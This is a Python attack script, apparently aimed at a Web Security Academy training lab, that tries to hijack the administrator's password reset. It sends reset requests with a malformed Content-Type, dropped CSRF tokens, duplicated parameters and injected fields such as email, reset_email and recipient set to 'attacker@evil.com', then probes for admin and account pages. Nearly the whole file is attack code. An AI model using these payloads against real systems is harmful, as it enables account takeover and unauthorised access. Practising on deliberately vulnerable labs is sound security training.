#!/usr/bin/env python3
import requests
import sys
import json
from urllib.parse import urlencode

def test_password_reset(lab_url, username="administrator"):
    """Test password reset with malformed Content-Type and various payloads"""

    # Base URL for the password reset endpoint
    reset_url = f"{lab_url}/forgot-password"

    # Test 1: Basic request with malformed Content-Type
    print(f"[*] Testing password reset for {username}")

    headers = {
        "Content-Type": "x-www-form-urlencoded",  # Malformed header
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": reset_url
    }

    # Different payload variations to test
    payloads = [
        # Basic payload
        {"csrf": "dummy", "username": username},

        # Try without CSRF token
        {"username": username},

        # Try with additional parameters that might override email
        {"csrf": "dummy", "username": username, "email": "attacker@evil.com"},

        # Try parameter pollution
        {"csrf": "dummy", "username": username, "username": "carlos", "email": "test@test.com"},

        # Try injecting into the result field
        {"csrf": "dummy", "username": username, "result": "attacker@evil.com"},

        # Try overriding the reset token destination
        {"csrf": "dummy", "username": username, "reset_email": "attacker@evil.com"},
        {"csrf": "dummy", "username": username, "to": "attacker@evil.com"},
        {"csrf": "dummy", "username": username, "recipient": "attacker@evil.com"},
    ]

    session = requests.Session()

    for i, payload in enumerate(payloads, 1):
        print(f"\n[Test {i}] Payload: {payload}")

        try:
            # Send with malformed Content-Type
            response = session.post(
                reset_url,
                data=urlencode(payload),
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")
            print(f"Headers: {dict(response.headers)}")

            # Check if response is JSON
            try:
                json_resp = response.json()
                print(f"JSON Response: {json.dumps(json_resp, indent=2)}")

                # Check if we got an email address in the response
                if "result" in json_resp:
                    print(f"[!] Email revealed: {json_resp['result']}")

                    # If we can control the email, we might be able to intercept the reset token
                    if "attacker" in str(json_resp.get("result", "")):
                        print("[!!!] Successfully redirected password reset email!")

            except json.JSONDecodeError:
                print(f"Response body: {response.text[:500]}")

        except Exception as e:
            print(f"Error: {e}")

    # Test 2: Try with different Content-Type variations
    print("\n[*] Testing Content-Type variations...")

    ct_variations = [
        "",  # Empty Content-Type
        "application/json",  # Wrong type
        "text/plain",  # Plain text
        "multipart/form-data",  # Multipart
    ]

    for ct in ct_variations:
        print(f"\n[*] Testing with Content-Type: {ct}")
        test_headers = headers.copy()
        test_headers["Content-Type"] = ct

        # Try JSON payload if Content-Type is json
        if "json" in ct:
            data = json.dumps({"username": username, "email": "attacker@evil.com"})
        else:
            data = urlencode({"csrf": "dummy", "username": username, "email": "attacker@evil.com"})

        try:
            response = session.post(
                reset_url,
                data=data,
                headers=test_headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")
            try:
                print(f"Response: {response.json()}")
            except:
                print(f"Response: {response.text[:200]}")

        except Exception as e:
            print(f"Error: {e}")

    # Test 3: Check if we can access admin panel or account page
    print("\n[*] Checking for accessible admin endpoints...")

    admin_endpoints = [
        "/admin",
        "/admin-panel",
        "/administrator",
        "/my-account",
        "/account",
        "/reset-password"
    ]

    for endpoint in admin_endpoints:
        url = lab_url + endpoint
        try:
            resp = session.get(url, allow_redirects=False)
            if resp.status_code in [200, 301, 302, 401, 403]:
                print(f"[+] Found: {endpoint} - Status: {resp.status_code}")
                if resp.status_code in [301, 302]:
                    print(f"    Redirects to: {resp.headers.get('Location')}")
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <lab_url>")
        print(f"Example: {sys.argv[0]} https://0a68006c04e623c680898f8d00ac0001.web-security-academy.net")
        sys.exit(1)

    lab_url = sys.argv[1].rstrip('/')
    test_password_reset(lab_url)